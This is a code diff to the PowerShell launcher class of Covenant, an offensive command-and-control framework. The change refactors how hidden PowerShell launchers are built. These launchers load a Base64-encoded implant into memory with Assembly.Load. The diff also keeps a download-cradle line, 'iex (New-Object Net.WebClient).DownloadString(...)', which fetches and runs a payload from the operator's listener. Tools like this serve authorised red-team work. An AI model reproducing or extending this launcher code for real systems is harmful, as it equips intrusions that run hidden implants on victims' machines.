@@ -3,6 +3,7 @@
 // License: GNU GPLv3
 
 using System;
+using System.Linq;
 using Microsoft.CodeAnalysis;
 
 using Covenant.Models.Grunts;
@@ -13,8 +14,8 @@ namespace Covenant.Models.Launchers
     public class PowerShellLauncher : Launcher
     {
         public string ParameterString { get; set; } = "-Sta -Nop -Window Hidden";
-        public string PowerShellCode { get; set; }
-        public string EncodedLauncherString { get; set; }
+        public string PowerShellCode { get; set; } = "";
+        public string EncodedLauncherString { get; set; } = "";
 
         public PowerShellLauncher()
         {
@@ -22,6 +23,7 @@ namespace Covenant.Models.Launchers
             this.Description = "Uses powershell.exe to launch a Grunt using [System.Reflection.Assembly]::Load()";
             this.Name = "PowerShell";
             this.OutputKind = OutputKind.WindowsApplication;
+            this.CompressStager = true;
         }
 
         public PowerShellLauncher(String parameterString) : base()
@@ -29,10 +31,10 @@ namespace Covenant.Models.Launchers
             this.ParameterString = parameterString;
         }
 
-        public override string GetLauncher(Listener listener, Grunt grunt, HttpProfile profile)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
-            this.StagerCode = listener.GetGruntStagerCode(grunt, profile);
-            this.Base64ILByteString = listener.CompileGruntStagerCode(grunt, profile, this.OutputKind, true);
+            this.StagerCode = StagerCode;
+            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
             this.PowerShellCode = PowerShellLauncherCodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
             return GetLauncher(PowerShellCode);
         }
@@ -57,7 +59,7 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-				Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
+				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                 string code = "iex (New-Object Net.WebClient).DownloadString('" + hostedLocation + "')";
                 this.LauncherString = GetLauncher(code);
                 return this.LauncherString;
